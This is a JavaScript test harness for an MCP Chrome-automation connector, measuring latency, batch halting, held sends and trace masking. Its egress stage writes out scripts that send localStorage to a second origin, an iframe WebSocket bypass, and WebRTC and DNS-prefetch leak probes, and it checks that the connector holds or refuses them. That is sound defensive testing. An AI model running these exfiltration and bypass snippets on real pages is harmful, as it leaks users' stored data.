// @ts-check
// real (standalone): the built vyre-chrome package, an MCP client, and a REAL Chrome with the REAL
// extension and native host, on a throwaway runner. It installs the connector the way a person
// would (cli.mjs install), talks to `cli.mjs mcp` over stdio like Claude Code, and measures:
//   per-call round trip through MCP, a 20-step batch as one call, a whole GoHighLevel-shaped flow
//   against the awkward fixture (slow route, popup, unsaved guard, toast, stale re-render), the
//   Esc halt of a running batch, the held-send path (chrome_send), the blind-page refusal, and
//   that the trace file exists and holds no secret. Never run this on a person's machine.
//
//   node standalone/harness/real.mjs [--iters 30] [--out file] [--chrome path] [--headless new|false]

// Chrome here is always launched through launchChrome (spike/harness/lib.mjs), which spreads CHROME_SAFE (lib/chrome-flags).
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawn, spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { hostManifest, launchChrome, parseArgs, prepareExtension, registerHost, resolveChrome, sleep, stats, stepSummary, stopProcess } from "../../spike/harness/lib.mjs";
import { startFixtureServer } from "../../bench/fixtures/server.mjs";
import { WORKFLOW_STEPS, GHL_ROBUST, CHECKOUT_FIELDS } from "../../bench/scenarios.mjs";
import { build } from "../build-release.mjs";

const here = path.dirname(fileURLToPath(import.meta.url));
const T0 = performance.now();
const log = (/** @type {string} */ m) => console.error(`[standalone +${Math.round(performance.now() - T0)}ms] ${m}`);
/** @template T @param {Promise<T>} p @param {number} ms @param {string} what @returns {Promise<T>} */
const within = (p, ms, what) => new Promise((res, rej) => { const t = setTimeout(() => rej(new Error(`${what} took longer than ${ms} ms`)), ms); p.then(v => { clearTimeout(t); res(v); }, e => { clearTimeout(t); rej(e); }); });

/** What a failed batch or flow says, short but complete about the step that failed. @param {any} r */
const brief = r => { try { const last = Array.isArray(r.results) ? r.results[r.results.length - 1] : undefined; return JSON.stringify({ done: r.done, failedAt: r.failedAt, code: r.code, why: r.why, failed: r.failed, last }).slice(0, 1500); } catch { return String(r).slice(0, 500); } };

/** A minimal MCP client over a child's stdio. @param {import("node:child_process").ChildProcess} child */
function mcpClient(child) {
  let n = 0, calls = 0, buf = ""; const waiting = new Map();
  /** @type {any} */ const c = child;
  c.stdout.on("data", (/** @type {any} */ d) => { buf += d; let i; while ((i = buf.indexOf("\n")) >= 0) { const line = buf.slice(0, i); buf = buf.slice(i + 1); if (!line.trim()) continue; try { const m = JSON.parse(line); waiting.get(m.id)?.(m); } catch { /* not ours */ } } });
  const rpc = (/** @type {string} */ method, /** @type {any} */ params, ms = 60_000) => within(new Promise(res => { const id = ++n; waiting.set(id, res); c.stdin.write(JSON.stringify({ jsonrpc: "2.0", id, method, params }) + "\n"); }), ms, `mcp ${method}`);
  /** A tool call: the parsed JSON result, or throws with the tool's error text. */
  const call = async (/** @type {string} */ name, /** @type {any} */ args = {}, ms = 60_000) => {
    const n = ++calls, t = performance.now();
    if (n <= 40 || n % 50 === 0) log(`> #${n} ${name}`);
    const r = /** @type {any} */ (await rpc("tools/call", { name, arguments: args }, ms).catch(e => { log(`! #${n} ${name} ${e.message}`); throw e; }));
    if (n <= 40 || n % 50 === 0) log(`< #${n} ${name} ${Math.round(performance.now() - t)}ms${r.result && r.result.isError ? " (error)" : ""}`);
    if (r.error) throw new Error(`${name}: rpc ${r.error.code} ${r.error.message}`);
    const text = (r.result.content.find((/** @type {any} */ x) => x.type === "text") || {}).text || "null";
    if (r.result.isError) throw Object.assign(new Error(`${name}: ${text.slice(0, 500)}`), { text });
    try { return JSON.parse(text); } catch { return text; }
  };
  return { rpc, call };
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const iters = Number(args.iters) || 30;
  const headless = args.headless === "false" ? false : typeof args.headless === "string" ? args.headless : "new";
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "vyre-sa-"));
  const udd = path.join(tmp, "profile"); fs.mkdirSync(udd);
  const data = path.join(tmp, "data");
  /** @type {Record<string, any>} */ const out = { tool: "chrome-standalone", os: `${process.platform}-${os.arch()}`, node: process.version, headless, stages: {}, at: new Date().toISOString() };
  setTimeout(() => {
    out.fatal = out.fatal || "watchdog: still running after 420 s";
    console.log(JSON.stringify(out, null, 2));
    if (typeof args.out === "string") { try { fs.mkdirSync(path.dirname(path.resolve(args.out)), { recursive: true }); fs.writeFileSync(args.out, JSON.stringify(out, null, 2)); } catch { /* best effort */ } }
    process.exit(3);
  }, 420_000).unref();
  /** @type {any} */ let chromeProc = null, fixture = null, mcp = null;
  const cleanups = /** @type {Array<()=>void>} */ ([]);
  const stage = async (/** @type {string} */ name, /** @type {()=>Promise<any>} */ fn) => {
    const t = performance.now(); log(`stage ${name}`);
    try { out.stages[name] = { ok: true, ...(await within(fn(), 120_000, `stage ${name}`)), ms: Math.round(performance.now() - t) }; log(`stage ${name} ok`); return true; }
    catch (e) { const m = String(/** @type {Error} */ (e).message || e); log(`stage ${name} FAILED: ${m.slice(0, 300)}`); out.stages[name] = { ok: false, error: m.slice(0, 600), ms: Math.round(performance.now() - t) }; return false; }
  };
  /** Time n runs of a call. @param {number} n @param {()=>Promise<any>} fn */
  const timed = async (n, fn) => { const xs = []; for (let i = 0; i < n; i++) { const t = performance.now(); await fn(); xs.push(performance.now() - t); } return stats(xs); };

  try {
    log("build the release");
    const rel = build({ out: path.join(tmp, "release") });
    out.release = { version: rel.version, sha256: rel.sha };
    const home = path.join(tmp, "home"); fs.mkdirSync(home);
    const env = { ...process.env, HOME: home, USERPROFILE: home, VYRE_CHROME_HOME: data };
    const cliInstall = path.join(rel.dir, "standalone", "cli.mjs");
    const app = path.join(data, "app");
    const cli = path.join(app, "standalone", "cli.mjs");
    log("cli install");
    const inst = spawnSync(process.execPath, [cliInstall, "install", "--browsers", "chrome"], { env, encoding: "utf8" });
    out.install = { status: inst.status, printedAddLine: /claude mcp add vyre-chrome/.test(inst.stdout || ""), stderr: (inst.stderr || "").slice(0, 300) };
    if (inst.status !== 0) throw new Error(`install failed: ${inst.stderr}`);
    const ext = prepareExtension(path.join(app, "extension"), path.join(tmp, "extension"));
    out.extensionId = ext.id;
    const launcher = path.join(app, "native-host", process.platform === "win32" ? "run-host.cmd" : "run-host.sh");
    cleanups.push(registerHost({ manifestObj: hostManifest({ wrapper: launcher, id: ext.id }), dir: tmp, userDataDir: udd }));

    fixture = await startFixtureServer();
    // This harness has no person to ask: a resume after the Esc stage must not wait for one.
    spawnSync(process.execPath, [cli, "config", "confirm-sends", "off"], { env, encoding: "utf8" });
    const child = spawn(process.execPath, [cli, "mcp"], { env, stdio: ["pipe", "pipe", "pipe"] });
    mcp = mcpClient(child);
    child.stderr.on("data", d => { const s = String(d).trim(); if (s) log(`mcp: ${s.slice(0, 200)}`); });
    cleanups.push(() => { try { child.kill(); } catch { /* gone */ } });
    await stage("mcp_initialize", async () => { const r = /** @type {any} */ (await mcp.rpc("initialize", { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "harness", version: "1" } })); const l = /** @type {any} */ (await mcp.rpc("tools/list", {})); return { server: r.result.serverInfo, tools: l.result.tools.length }; });

    const chrome = resolveChrome({ chrome: typeof args.chrome === "string" ? args.chrome : undefined });
    out.chrome = chrome.version;
    const launched = launchChrome({ chrome: chrome.path, userDataDir: udd, url: `${fixture.url}/checkout`, extraArgs: [`--load-extension=${ext.dir}`, `--disable-extensions-except=${ext.dir}`], headless, logFile: path.join(tmp, "chrome.log") });
    chromeProc = launched.child; log("chrome launched");

    const connected = await stage("connected", async () => {
      const end = Date.now() + 45_000;
      for (;;) { const s = await mcp.call("chrome_status", {}); if (s.connected) return { extension: s.extension && { protocol: s.extension.protocol, version: s.extension.version } }; if (Date.now() > end) throw new Error("the extension never connected: " + JSON.stringify(s).slice(0, 300)); await sleep(250); }
    });
    if (connected) {
      /** @type {any} */ let tab;
      await stage("tabs_use", async () => { const r = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}/checkout`, openIfMissing: true }); tab = r.id ?? (r.tab && r.tab.id); return { tab }; });
      await stage("snapshot", async () => { const s = await mcp.call("chrome_snapshot", { tab }); return { controls: (s.controls || []).length, ms: undefined, latency: await timed(iters, () => mcp.call("chrome_snapshot", { tab })) }; });
      await stage("fill_12", async () => ({ latency: await timed(iters, () => mcp.call("chrome_fill", { tab, fields: CHECKOUT_FIELDS.map(f => ({ selector: { identifier: f.selector.replace(/^#/, "") }, value: f.value })) })) }));
      await stage("click", async () => ({ latency: await timed(iters, () => mcp.call("chrome_act", { tab, selector: { identifier: "apply-promo" }, kind: "click" })) }));

      await stage("batch_20_one_call", async () => {
        const g = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}/ghl`, openIfMissing: true }); const gt = g.id ?? (g.tab && g.tab.id);
        const steps = WORKFLOW_STEPS.map(s => s.op === "click"
          ? { op: "page.act", args: { tabId: gt, selector: { identifier: (/data-testid="([^"]+)"/.exec(s.selector) || [])[1] }, kind: "click" } }
          : { op: "page.fill", args: { tabId: gt, fields: [{ selector: { identifier: s.selector.replace(/^#/, "") }, value: s.value }] } });
        const batchMs = /** @type {number[]} */ ([]);
        for (let k = 0; k < 5; k++) {
          await mcp.call("chrome_tabs", { action: "navigate", tab: gt, url: `${fixture.url}/ghl` }); await sleep(200);
          const t = performance.now(); const r = await mcp.call("chrome_batch", { tab: gt, steps });
          if (r.ok === false) throw new Error("batch failed: " + brief(r));
          batchMs.push(performance.now() - t);
        }
        return { steps: steps.length, oneCall: stats(batchMs) };
      });

      await stage("ghl_robust_flow", async () => {
        const r = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}${GHL_ROBUST.path}`, openIfMissing: true }); const gt = r.id ?? (r.tab && r.tab.id);
        await mcp.call("chrome_tabs", { action: "navigate", tab: gt, url: `${fixture.url}${GHL_ROBUST.path}` }); await sleep(300);
        const t0 = performance.now();
        await mcp.call("chrome_batch", { tab: gt, steps: GHL_ROBUST.before.map(s => ({ ...s, args: { ...s.args, tabId: gt } })) });
        const run = await mcp.call("chrome_ghl", { action: "run", tab: gt, flow: GHL_ROBUST.flow, params: GHL_ROBUST.params }, 90_000);
        const ms = Math.round(performance.now() - t0);
        const st = await mcp.call("chrome_eval", { tab: gt, expression: "JSON.stringify(window.__state)" });
        const state = JSON.parse(typeof st === "string" ? st : (st.value ?? st.result ?? "null"));
        const view = { ...state, steps: (state.steps || []).length };
        for (const [k, v] of Object.entries(GHL_ROBUST.expect.state)) if (JSON.stringify(/** @type {any} */ (view)[k]) !== JSON.stringify(v)) throw new Error(`state.${k} is ${JSON.stringify(/** @type {any} */ (view)[k])}, wanted ${JSON.stringify(v)}; run: ${brief(run)}`);
        return { ms, ok: run.ok !== false, state: { saved: state.saved, steps: (state.steps || []).length, trigger: state.trigger, whatsnewClosed: state.whatsnewClosed, discarded: state.discarded } };
      });

      await stage("esc_halts_batch", async () => {
        const g = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}/ghl`, openIfMissing: true }); const gt = g.id ?? (g.tab && g.tab.id);
        await mcp.call("chrome_tabs", { action: "navigate", tab: gt, url: `${fixture.url}/ghl` }); await sleep(200);
        const one = WORKFLOW_STEPS.map(s => s.op === "click"
          ? { op: "page.act", args: { tabId: gt, selector: { identifier: (/data-testid="([^"]+)"/.exec(s.selector) || [])[1] }, kind: "click" } }
          : { op: "page.fill", args: { tabId: gt, fields: [{ selector: { identifier: s.selector.replace(/^#/, "") }, value: s.value }] } });
        const steps = [...one, ...one, ...one, ...one, ...one];
        const run = mcp.call("chrome_batch", { tab: gt, steps }, 60_000).then(r => ({ r }), e => ({ e }));
        await sleep(25);
        const t0 = performance.now();
        await mcp.call("chrome_stop", { by: "esc" });
        const res = /** @type {any} */ (await run);
        const haltMs = Math.round(performance.now() - t0);
        const r = res.r || {}; const code = r.code || (res.e && /stopped/.test(String(res.e.message)) ? "stopped" : "");
        await mcp.call("chrome_resume", { answer: "ok" }).catch(() => {});
        if (code !== "stopped") throw new Error("the batch was not halted by Esc: " + JSON.stringify(res).slice(0, 300));
        return { stopToBatchReturnMs: haltMs, extensionHaltMs: r.haltMs ?? null, doneBeforeStop: r.done ?? null, of: steps.length };
      });

      await stage("held_send", async () => {
        const c = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}/checkout`, openIfMissing: true }); const ct = c.id ?? (c.tab && c.tab.id);
        await mcp.call("chrome_tabs", { action: "navigate", tab: ct, url: `${fixture.url}/checkout` }); await sleep(300);
        const h = await mcp.call("chrome_act", { tab: ct, selector: { identifier: "place-order" }, kind: "click" });
        if (!h.held || !h.id) throw new Error("the order button was not held: " + JSON.stringify(h).slice(0, 300));
        const sent = await mcp.call("chrome_send", { id: h.id });
        const again = await mcp.call("chrome_send", { id: h.id }).then(() => "sent twice", e => e.text ? "refused" : "refused");
        return { held: true, sentOk: sent && sent.ok !== false, secondSend: again };
      });

      await stage("egress_blocked", async () => {
        // A second fixture server is a second origin: a script that sends the page's storage there must be held.
        const other = await startFixtureServer();
        try {
          const r = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}/checkout`, openIfMissing: true }); const et = r.id ?? (r.tab && r.tab.id);
          await mcp.call("chrome_tabs", { action: "navigate", tab: et, url: `${fixture.url}/checkout` }); await sleep(300);
          const evil = `${other.url}/collect?d=`;
          const held = await mcp.call("chrome_eval", { tab: et, expression: `(async () => { localStorage.setItem('k', 'v'); try { await fetch(${JSON.stringify(evil)} + encodeURIComponent(JSON.stringify(localStorage))); } catch (e) {} new Image().src = ${JSON.stringify(evil)} + 'img'; return 1; })()` });
          if (!held.held) throw new Error("a script sending storage to a second origin was not held: " + JSON.stringify(held).slice(0, 300));
          const own = await mcp.call("chrome_eval", { tab: et, expression: `fetch('/api/contacts?limit=1').then(r => r.status)` });
          if (own.held || own.ok === false) throw new Error("the page's own API call was refused: " + JSON.stringify(own).slice(0, 300));
          // A real WebSocket server on two origins: does a NEW handshake reach the second while the guard is up, and does a socket
          // the page already held (opened before, to the first) still carry data?
          const { createServer } = await import("node:http"); const { createHash } = await import("node:crypto");
          const mkWs = (/** @type {string} */ urlHost = "127.0.0.1") => new Promise(res => { const st = { upgrades: 0, bytes: 0, url: "", close: () => {} }; const srv = createServer((q, r) => r.end("ok"));
            srv.on("upgrade", (q, sock) => { st.upgrades++; const key = createHash("sha1").update(q.headers["sec-websocket-key"] + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").digest("base64"); sock.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${key}\r\n\r\n`); sock.on("data", d => { st.bytes += d.length; }); sock.on("error", () => {}); });
            srv.listen(0, "127.0.0.1", () => { st.url = `ws://${urlHost}:${/** @type {any} */ (srv.address()).port}/`; st.close = () => srv.close(); res(st); }); });
          // The page is on 127.0.0.1, so "localhost" is a fresh domain (the browser-level rule works on domains).
          const wsA = await mkWs(), wsB = await mkWs("localhost"), wsC = await mkWs("localhost");
          const opened = await mcp.call("chrome_eval", { tab: et, asked: true, expression: `new Promise(r => { window.__ws = new WebSocket(${JSON.stringify(wsA.url)}); window.__ws.onopen = () => r('open'); window.__ws.onerror = () => r('error'); setTimeout(() => r('timeout'), 3000); })` }).catch(e => ({ error: String(e.message) }));
          const before = wsA.bytes;
          const freshGuarded = await mcp.call("chrome_eval", { tab: et, expression: `(async () => { try { new WebSocket(${JSON.stringify(wsB.url)}); } catch (e) {} await new Promise(r => setTimeout(r, 700)); return 1; })()` }).catch(e => ({ error: String(e.message) }));
          const existingGuarded = await mcp.call("chrome_eval", { tab: et, expression: `(async () => { try { window.__ws.send('hello-from-existing-socket'); } catch (e) { return 'threw'; } await new Promise(r => setTimeout(r, 500)); return 'sent'; })()` }).catch(e => ({ error: String(e.message) }));
          await sleep(300);
          const guardedFreshUpgrades = wsB.upgrades;
          const guardedIframeBefore = wsC.upgrades;
          // Bypass form: a fresh iframe's own WebSocket constructor (the page shim does not reach it; the browser-level rule does).
          await mcp.call("chrome_eval", { tab: et, expression: `(async () => { const f = document.createElement('iframe'); document.body.appendChild(f); try { new f.contentWindow.WebSocket(${JSON.stringify(wsC.url)}); } catch (e) {} await new Promise(r => setTimeout(r, 700)); return 1; })()` }).catch(() => ({}));
          // A new socket to the page's own domain must still be allowed during the guard.
          const knownBefore = wsA.upgrades;
          await mcp.call("chrome_eval", { tab: et, expression: `(async () => { try { new WebSocket(${JSON.stringify(wsA.url)}); } catch (e) {} await new Promise(r => setTimeout(r, 700)); return 1; })()` }).catch(() => ({}));
          const freshUnguarded = await mcp.call("chrome_eval", { tab: et, asked: true, expression: `(async () => { try { new WebSocket(${JSON.stringify(wsB.url)}); } catch (e) {} await new Promise(r => setTimeout(r, 700)); return 1; })()` }).catch(e => ({ error: String(e.message) }));
          await sleep(300);
          const websocketProof = { serverWorks: opened && opened.value === "open", freshHandshakesWhileGuarded: guardedFreshUpgrades === 0 ? "refused (server saw none)" : `NOT refused (${guardedFreshUpgrades} handshakes)`, existingSocketBytesAfterGuardedSend: wsA.bytes - before, freshHandshakesAfterUnguardedControl: wsB.upgrades, iframeBypassHandshakes: wsC.upgrades - guardedIframeBefore, newSocketToKnownDomainAllowed: wsA.upgrades - knownBefore >= 1, guardedFreshHeld: freshGuarded && freshGuarded.held === true, existingResult: existingGuarded && (existingGuarded.value ?? existingGuarded.error) };
          wsA.close(); wsB.close(); wsC.close();
          // Channels the Fetch domain does not see. Reported as they are: held or not, no claim beyond what this shows.
          const host = new URL(other.url).host;
          const probe = async (/** @type {string} */ name, /** @type {string} */ expression) => { try { const r = await mcp.call("chrome_eval", { tab: et, expression }); return { held: r.held === true, value: r.value, error: r.error }; } catch (e) { return { threw: String(/** @type {Error} */ (e).message).slice(0, 160) }; } };
          const channels = {
            websocket: await probe("websocket", `(() => { try { new WebSocket('ws://${host}/x'); } catch (e) {} return 1; })()`),
            webrtc: await probe("webrtc", `(() => { try { new RTCPeerConnection({ iceServers: [{ urls: 'stun:${host.replace(/:\d+$/, "")}:3478' }] }); } catch (e) {} return 1; })()`),
            dnsPrefetch: await probe("dns", `(() => { const l = document.createElement('link'); l.rel = 'dns-prefetch'; l.href = 'http://${host}/'; document.head.appendChild(l); return 1; })()`),
            preconnect: await probe("preconnect", `(() => { const l = document.createElement('link'); l.rel = 'preconnect'; l.href = 'http://${host}/'; document.head.append(l); return 1; })()`),
          };
          return { heldOutside: true, ownOriginValue: own.value, websocketProof, channels };
        } finally { await other.close(); }
      });

      await stage("blind_refused", async () => {
        let msg = "";
        try { await mcp.call("chrome_tabs", { action: "open", url: "chrome://settings/passwords" }); } catch (e) { msg = String(/** @type {Error} */ (e).message); }
        if (!/blocked/.test(msg)) throw new Error(`expected blocked, got ${JSON.stringify(msg).slice(0, 200)}`);
        return { refused: true };
      });

      await stage("trace_and_report", async () => {
        const logs = path.join(data, "logs");
        const files = fs.readdirSync(logs).filter(f => f.endsWith(".jsonl"));
        const text = files.map(f => fs.readFileSync(path.join(logs, f), "utf8")).join("");
        const lines = text.split("\n").filter(Boolean).map(l => JSON.parse(l));
        const calls = lines.filter(l => l.kind === "call");
        if (!calls.length) throw new Error("the trace has no calls");
        if (/alex@example\.com|4242424242424242/.test(text)) throw new Error("the trace holds a value that must be masked");
        const rep = spawnSync(process.execPath, [cli, "report", "--last", "1"], { env, encoding: "utf8" });
        if (rep.status !== 0) throw new Error("report failed: " + rep.stderr);
        return { calls: calls.length, withStrategy: calls.filter(c => c.strategy !== undefined).length, failures: calls.filter(c => !c.ok).length, report: (rep.stdout || "").split("\n")[1] || "" };
      });
    }
  } catch (e) {
    out.fatal = String(/** @type {Error} */ (e).message || e);
    try { out.chromeLogTail = fs.readFileSync(path.join(tmp, "chrome.log"), "utf8").slice(-1500); } catch { /* no log */ }
  } finally {
    log("cleanup");
    stopProcess(chromeProc);
    for (const c of cleanups) try { c(); } catch { /* best effort */ }
    await within(Promise.resolve(fixture?.close()), 5000, "closing the fixture").catch(e => log(String(e.message)));
    setTimeout(() => { try { fs.rmSync(tmp, { recursive: true, force: true }); } catch { /* best effort */ } }, 2500).unref();
  }
  const failed = Object.entries(out.stages).filter(([, v]) => /** @type {any} */ (v).ok === false).map(([k]) => k);
  out.ok = !out.fatal && failed.length === 0;
  const s = out.stages;
  const line = `chrome-standalone ${out.ok ? "PASS" : "FAIL"} ${out.os}: mcp click p50 ${s.click?.latency?.p50 ?? "n/a"} ms, 12-field fill p50 ${s.fill_12?.latency?.p50 ?? "n/a"} ms, 20-step batch one call p50 ${s.batch_20_one_call?.oneCall?.p50 ?? "n/a"} ms, GHL robust flow ${s.ghl_robust_flow?.ms ?? "n/a"} ms, Esc halt ${s.esc_halts_batch?.stopToBatchReturnMs ?? "n/a"} ms${out.ok ? "" : `; failed: ${[...failed, ...(out.fatal ? ["fatal"] : [])].join(",")}`}`;
  console.log(JSON.stringify(out, null, 2)); console.log(line);
  stepSummary(`- ${line}`);
  if (typeof args.out === "string") { fs.mkdirSync(path.dirname(path.resolve(args.out)), { recursive: true }); fs.writeFileSync(args.out, JSON.stringify(out, null, 2)); }
  process.exitCode = out.ok ? 0 : 1;
}
main().then(() => setTimeout(() => process.exit(process.exitCode || 0), 3000).unref(), e => { console.error(e); process.exit(1); });
